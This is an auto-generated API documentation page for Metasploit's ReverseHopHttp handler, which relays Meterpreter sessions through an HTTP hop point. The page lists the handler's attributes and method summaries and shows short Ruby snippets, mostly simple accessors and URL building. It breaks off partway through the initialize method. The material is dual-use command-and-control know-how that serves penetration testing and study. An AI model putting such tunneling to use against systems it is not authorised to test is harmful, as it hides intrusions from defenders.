<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  Module: Msf::Handler::ReverseHopHttp
  
    &mdash; Documentation by YARD 0.8.7.4
  
</title>

  <link rel="stylesheet" href="../../css/style.css" type="text/css" charset="utf-8" />

  <link rel="stylesheet" href="../../css/common.css" type="text/css" charset="utf-8" />

<script type="text/javascript" charset="utf-8">
  hasFrames = window.top.frames.main ? true : false;
  relpath = '../../';
  framesUrl = "../../frames.html#!Msf/Handler/ReverseHopHttp.html";
</script>


  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>


  </head>
  <body>
    <div id="header">
      <div id="menu">
  
    <a href="../../_index.html">Index (R)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Handler.html" title="Msf::Handler (module)">Handler</a></span></span>
     &raquo; 
    <span class="title">ReverseHopHttp</span>
  

  <div class="noframes"><span class="title">(</span><a href="." target="_top">no frames</a><span class="title">)</span></div>
</div>

      <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../class_list.html">
      Class List
    </a>
  
    <a class="full_list_link" id="method_list_link"
        href="../../method_list.html">
      Method List
    </a>
  
    <a class="full_list_link" id="file_list_link"
        href="../../file_list.html">
      File List
    </a>
  
</div>
      <div class="clear"></div>
    </div>

    <iframe id="search_frame"></iframe>

    <div id="content"><h1>Module: Msf::Handler::ReverseHopHttp
  
  
  
</h1>

<dl class="box">
  
  
    
  
    
      <dt class="r1">Includes:</dt>
      <dd class="r1"><span class='object_link'><a href="ReverseHttp.html" title="Msf::Handler::ReverseHttp (module)">ReverseHttp</a></span></dd>
      
    
  
  
  
    <dt class="r2 last">Defined in:</dt>
    <dd class="r2 last">lib/msf/core/handler/reverse_hop_http.rb</dd>
  
</dl>
<div class="clear"></div>

<h2>Overview</h2><div class="docstring">
  <div class="discussion">
    
<p>This handler implements the HTTP hop tunneling interface. It acts like an
HTTP server to the meterpreter packet dispatcher but as an HTTP client to
actually send and receive the data from the hop.</p>


  </div>
</div>
<div class="tags">
  

</div>
  <h2>Constant Summary</h2>
  
    <dl class="constants">
      
        <dt id="MAGIC-constant" class="">MAGIC =
          <div class="docstring">
  <div class="discussion">
    
<p>Magic bytes to know we are talking to a valid hop</p>


  </div>
</div>
<div class="tags">
  

</div>
        </dt>
        <dd><pre class="code"><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>TzGq</span><span class='tstring_end'>&#39;</span></span></pre></dd>
      
    </dl>
  



  
  
  <h3 class="inherited">Constants included
     from <span class='object_link'><a href="ReverseHttp/UriChecksum.html" title="Msf::Handler::ReverseHttp::UriChecksum (module)">Msf::Handler::ReverseHttp::UriChecksum</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="ReverseHttp/UriChecksum.html#URI_CHECKSUM_CONN-constant" title="Msf::Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_CONN (constant)">Msf::Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_CONN</a></span>, <span class='object_link'><a href="ReverseHttp/UriChecksum.html#URI_CHECKSUM_INITJ-constant" title="Msf::Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_INITJ (constant)">Msf::Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_INITJ</a></span>, <span class='object_link'><a href="ReverseHttp/UriChecksum.html#URI_CHECKSUM_INITW-constant" title="Msf::Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_INITW (constant)">Msf::Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_INITW</a></span>, <span class='object_link'><a href="ReverseHttp/UriChecksum.html#URI_CHECKSUM_PRECALC-constant" title="Msf::Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_PRECALC (constant)">Msf::Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_PRECALC</a></span></p>

  
  
  <h3 class="inherited">Constants included
     from <span class='object_link'><a href="../Handler.html" title="Msf::Handler (module)">Msf::Handler</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Handler.html#Claimed-constant" title="Msf::Handler::Claimed (constant)">Claimed</a></span>, <span class='object_link'><a href="../Handler.html#Unused-constant" title="Msf::Handler::Unused (constant)">Unused</a></span></p>


  <h2>Class Attribute Summary <small>(<a href="#" class="summary_toggle">collapse</a>)</small></h2>
  <ul class="summary">
    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#hop_handlers-class_method" title="hop_handlers (class method)">+ (Object) <strong>hop_handlers</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns the value of attribute hop_handlers.</p>
</div></span>
  
</li>

    
  </ul>

  <h2>Instance Attribute Summary <small>(<a href="#" class="summary_toggle">collapse</a>)</small></h2>
  <ul class="summary">
    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#closed_handlers-instance_method" title="#closed_handlers (instance method)">- (Object) <strong>closed_handlers</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>:nodoc:.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#control-instance_method" title="#control (instance method)">- (Object) <strong>control</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>:nodoc:.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#current_url-instance_method" title="#current_url (instance method)">- (Object) <strong>current_url</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>:nodoc:.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#handlers-instance_method" title="#handlers (instance method)">- (Object) <strong>handlers</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>:nodoc:.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#lock-instance_method" title="#lock (instance method)">- (Object) <strong>lock</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>:nodoc: :nodoc:.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#mclient-instance_method" title="#mclient (instance method)">- (Object) <strong>mclient</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>:nodoc:.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#monitor_thread-instance_method" title="#monitor_thread (instance method)">- (Object) <strong>monitor_thread</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>:nodoc:.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#refs-instance_method" title="#refs (instance method)">- (Object) <strong>refs</strong> </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns the value of attribute refs.</p>
</div></span>
  
</li>

    
  </ul>



  
  
  <h3 class="inherited">Attributes included from <span class='object_link'><a href="ReverseHttp.html" title="Msf::Handler::ReverseHttp (module)">ReverseHttp</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="ReverseHttp.html#service-instance_method" title="Msf::Handler::ReverseHttp#service (method)">#service</a></span></p>

  
  
  <h3 class="inherited">Attributes included from <span class='object_link'><a href="../Handler.html" title="Msf::Handler (module)">Msf::Handler</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Handler.html#exploit_config-instance_method" title="Msf::Handler#exploit_config (method)">#exploit_config</a></span>, <span class='object_link'><a href="../Handler.html#parent_payload-instance_method" title="Msf::Handler#parent_payload (method)">#parent_payload</a></span>, <span class='object_link'><a href="../Handler.html#pending_connections-instance_method" title="Msf::Handler#pending_connections (method)">#pending_connections</a></span>, <span class='object_link'><a href="../Handler.html#session_waiter_event-instance_method" title="Msf::Handler#session_waiter_event (method)">#session_waiter_event</a></span></p>


  
    <h2>
      Class Method Summary
      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#general_handler_type-class_method" title="general_handler_type (class method)">+ (Object) <strong>general_handler_type</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns the connection-described general handler type, in this case
&#39;tunnel&#39;.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#handler_type-class_method" title="handler_type (class method)">+ (Object) <strong>handler_type</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns the string representation of the handler type.</p>
</div></span>
  
</li>

      
    </ul>
  
    <h2>
      Instance Method Summary
      <small>(<a href="#" class="summary_toggle">collapse</a>)</small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#add_resource-instance_method" title="#add_resource (instance method)">- (Object) <strong>add_resource</strong>(res, opts = {}) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Adds a resource.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#close_client-instance_method" title="#close_client (instance method)">- (Object) <strong>close_client</strong>(cli) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Implemented for compatibility reasons, does nothing.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#full_uri-instance_method" title="#full_uri (instance method)">- (Object) <strong>full_uri</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Return the URI of the hop point.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#initialize-instance_method" title="#initialize (instance method)">- (Object) <strong>initialize</strong>(info = {}) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Initializes the Hop HTTP tunneling handler.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#localinfo-instance_method" title="#localinfo (instance method)">- (Object) <strong>localinfo</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns a string representation of the local hop.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#peerinfo-instance_method" title="#peerinfo (instance method)">- (Object) <strong>peerinfo</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns the URL of the remote hop end.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#remove_resource-instance_method" title="#remove_resource (instance method)">- (Object) <strong>remove_resource</strong>(res) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Removes a resource.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#send_new_stage-instance_method" title="#send_new_stage (instance method)">- (Object) <strong>send_new_stage</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generates and sends a stage up to the hop point to be ready for the next
client.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#send_response-instance_method" title="#send_response (instance method)">- (Object) <strong>send_response</strong>(resp) </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Sends data to hop.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#setup_handler-instance_method" title="#setup_handler (instance method)">- (Object) <strong>setup_handler</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Sets up a handler.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#start_handler-instance_method" title="#start_handler (instance method)">- (Object) <strong>start_handler</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Starts the handler along with a monitoring thread to handle data transfer.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#stop_handler-instance_method" title="#stop_handler (instance method)">- (Object) <strong>stop_handler</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Stops the handler and monitoring thread.</p>
</div></span>
  
</li>

      
    </ul>
  


  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="ReverseHttp.html" title="Msf::Handler::ReverseHttp (module)">ReverseHttp</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="ReverseHttp.html#bind_port-instance_method" title="Msf::Handler::ReverseHttp#bind_port (method)">#bind_port</a></span>, <span class='object_link'><a href="ReverseHttp.html#cleanup_handler-instance_method" title="Msf::Handler::ReverseHttp#cleanup_handler (method)">#cleanup_handler</a></span>, <span class='object_link'><a href="ReverseHttp.html#ipv6%3F-instance_method" title="Msf::Handler::ReverseHttp#ipv6? (method)">#ipv6?</a></span>, <span class='object_link'><a href="ReverseHttp.html#listener_address-instance_method" title="Msf::Handler::ReverseHttp#listener_address (method)">#listener_address</a></span>, <span class='object_link'><a href="ReverseHttp.html#listener_uri-instance_method" title="Msf::Handler::ReverseHttp#listener_uri (method)">#listener_uri</a></span>, <span class='object_link'><a href="ReverseHttp.html#on_request-instance_method" title="Msf::Handler::ReverseHttp#on_request (method)">#on_request</a></span>, <span class='object_link'><a href="ReverseHttp.html#payload_uri-instance_method" title="Msf::Handler::ReverseHttp#payload_uri (method)">#payload_uri</a></span>, <span class='object_link'><a href="ReverseHttp.html#scheme-instance_method" title="Msf::Handler::ReverseHttp#scheme (method)">#scheme</a></span>, <span class='object_link'><a href="ReverseHttp.html#ssl%3F-instance_method" title="Msf::Handler::ReverseHttp#ssl? (method)">#ssl?</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="ReverseHttp/UriChecksum.html" title="Msf::Handler::ReverseHttp::UriChecksum (module)">Msf::Handler::ReverseHttp::UriChecksum</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="ReverseHttp/UriChecksum.html#generate_uri_checksum-instance_method" title="Msf::Handler::ReverseHttp::UriChecksum#generate_uri_checksum (method)">#generate_uri_checksum</a></span>, <span class='object_link'><a href="ReverseHttp/UriChecksum.html#process_uri_resource-instance_method" title="Msf::Handler::ReverseHttp::UriChecksum#process_uri_resource (method)">#process_uri_resource</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Handler.html" title="Msf::Handler (module)">Msf::Handler</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Handler.html#add_handler-instance_method" title="Msf::Handler#add_handler (method)">#add_handler</a></span>, <span class='object_link'><a href="../Handler.html#cleanup_handler-instance_method" title="Msf::Handler#cleanup_handler (method)">#cleanup_handler</a></span>, <span class='object_link'><a href="../Handler.html#create_session-instance_method" title="Msf::Handler#create_session (method)">#create_session</a></span>, <span class='object_link'><a href="../Handler.html#handle_connection-instance_method" title="Msf::Handler#handle_connection (method)">#handle_connection</a></span>, <span class='object_link'><a href="../Handler.html#handler-instance_method" title="Msf::Handler#handler (method)">#handler</a></span>, <span class='object_link'><a href="../Handler.html#handler_name-instance_method" title="Msf::Handler#handler_name (method)">#handler_name</a></span>, <span class='object_link'><a href="../Handler.html#register_session-instance_method" title="Msf::Handler#register_session (method)">#register_session</a></span>, <span class='object_link'><a href="../Handler.html#wait_for_session-instance_method" title="Msf::Handler#wait_for_session (method)">#wait_for_session</a></span>, <span class='object_link'><a href="../Handler.html#wfs_delay-instance_method" title="Msf::Handler#wfs_delay (method)">#wfs_delay</a></span></p>

  <div id="class_attr_details" class="attr_details">
    <h2>Class Attribute Details</h2>
    
      
      <span id="hop_handlers=-class_method"></span>
      <div class="method_details first">
  <h3 class="signature first" id="hop_handlers-class_method">
  
    + (<tt>Object</tt>) <strong>hop_handlers</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns the value of attribute hop_handlers</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


27
28
29</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 27</span>

<span class='kw'>def</span> <span class='id identifier rubyid_hop_handlers'>hop_handlers</span>
  <span class='ivar'>@hop_handlers</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

  <div id="instance_attr_details" class="attr_details">
    <h2>Instance Attribute Details</h2>
    
      
      <span id="closed_handlers=-instance_method"></span>
      <div class="method_details first">
  <h3 class="signature first" id="closed_handlers-instance_method">
  
    - (<tt>Object</tt>) <strong>closed_handlers</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>:nodoc:</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


30
31
32</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 30</span>

<span class='kw'>def</span> <span class='id identifier rubyid_closed_handlers'>closed_handlers</span>
  <span class='ivar'>@closed_handlers</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="control=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="control-instance_method">
  
    - (<tt>Object</tt>) <strong>control</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>:nodoc:</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


33
34
35</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 33</span>

<span class='kw'>def</span> <span class='id identifier rubyid_control'>control</span>
  <span class='ivar'>@control</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="current_url=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="current_url-instance_method">
  
    - (<tt>Object</tt>) <strong>current_url</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>:nodoc:</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


32
33
34</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 32</span>

<span class='kw'>def</span> <span class='id identifier rubyid_current_url'>current_url</span>
  <span class='ivar'>@current_url</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="handlers=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="handlers-instance_method">
  
    - (<tt>Object</tt>) <strong>handlers</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>:nodoc:</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


29
30
31</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 29</span>

<span class='kw'>def</span> <span class='id identifier rubyid_handlers'>handlers</span>
  <span class='ivar'>@handlers</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="lock=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="lock-instance_method">
  
    - (<tt>Object</tt>) <strong>lock</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>:nodoc: :nodoc:</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


35
36
37</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 35</span>

<span class='kw'>def</span> <span class='id identifier rubyid_lock'>lock</span>
  <span class='ivar'>@lock</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="mclient=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="mclient-instance_method">
  
    - (<tt>Object</tt>) <strong>mclient</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>:nodoc:</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


31
32
33</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 31</span>

<span class='kw'>def</span> <span class='id identifier rubyid_mclient'>mclient</span>
  <span class='ivar'>@mclient</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="monitor_thread=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="monitor_thread-instance_method">
  
    - (<tt>Object</tt>) <strong>monitor_thread</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>:nodoc:</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


28
29
30</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 28</span>

<span class='kw'>def</span> <span class='id identifier rubyid_monitor_thread'>monitor_thread</span>
  <span class='ivar'>@monitor_thread</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="refs=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="refs-instance_method">
  
    - (<tt>Object</tt>) <strong>refs</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns the value of attribute refs</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


34
35
36</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 34</span>

<span class='kw'>def</span> <span class='id identifier rubyid_refs'>refs</span>
  <span class='ivar'>@refs</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>


  <div id="class_method_details" class="method_details_list">
    <h2>Class Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="general_handler_type-class_method">
  
    + (<tt>Object</tt>) <strong>general_handler_type</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns the connection-described general handler type, in this case
&#39;tunnel&#39;.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


53
54
55</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 53</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_general_handler_type'>general_handler_type</span>
  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>tunnel</span><span class='tstring_end'>&quot;</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="handler_type-class_method">
  
    + (<tt>Object</tt>) <strong>handler_type</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns the string representation of the handler type</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


45
46
47</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 45</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_handler_type'>handler_type</span>
  <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>reverse_hop_http</span><span class='tstring_end'>&quot;</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

  <div id="instance_method_details" class="method_details_list">
    <h2>Instance Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="add_resource-instance_method">
  
    - (<tt>Object</tt>) <strong>add_resource</strong>(res, opts = {}) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Adds a resource. (handler for a session)</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


166
167
168
169</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 166</span>

<span class='kw'>def</span> <span class='id identifier rubyid_add_resource'>add_resource</span><span class='lparen'>(</span><span class='id identifier rubyid_res'>res</span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_handlers'>handlers</span><span class='lbracket'>[</span><span class='id identifier rubyid_res'>res</span><span class='rbracket'>]</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Proc</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='id identifier rubyid_start_handler'>start_handler</span> <span class='kw'>if</span> <span class='id identifier rubyid_monitor_thread'>monitor_thread</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="close_client-instance_method">
  
    - (<tt>Object</tt>) <strong>close_client</strong>(cli) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Implemented for compatibility reasons, does nothing</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


184
185</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 184</span>

<span class='kw'>def</span> <span class='id identifier rubyid_close_client'>close_client</span><span class='lparen'>(</span><span class='id identifier rubyid_cli'>cli</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="full_uri-instance_method">
  
    - (<tt>Object</tt>) <strong>full_uri</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Return the URI of the hop point.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


206
207
208
209
210
211</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 206</span>

<span class='kw'>def</span> <span class='id identifier rubyid_full_uri'>full_uri</span>
  <span class='id identifier rubyid_uri'>uri</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HOPURL</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='kw'>return</span> <span class='id identifier rubyid_uri'>uri</span> <span class='kw'>if</span> <span class='id identifier rubyid_uri'>uri</span><span class='period'>.</span><span class='id identifier rubyid_end_with?'>end_with?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_uri'>uri</span><span class='embexpr_end'>}</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_uri'>uri</span><span class='period'>.</span><span class='id identifier rubyid_end_with?'>end_with?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>?</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_uri'>uri</span><span class='embexpr_end'>}</span><span class='tstring_content'>?/</span><span class='tstring_end'>&quot;</span></span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="initialize-instance_method">
  
    - (<tt>Object</tt>) <strong>initialize</strong>(info = {}) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Initializes the Hop HTTP tunneling handler.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


231
232
233
234
235
236
237
238
239</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 231</span>

<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='kw'>super</span>

  <span class='id identifier rubyid_register_options'>register_options</span><span class='lparen'>(</span>
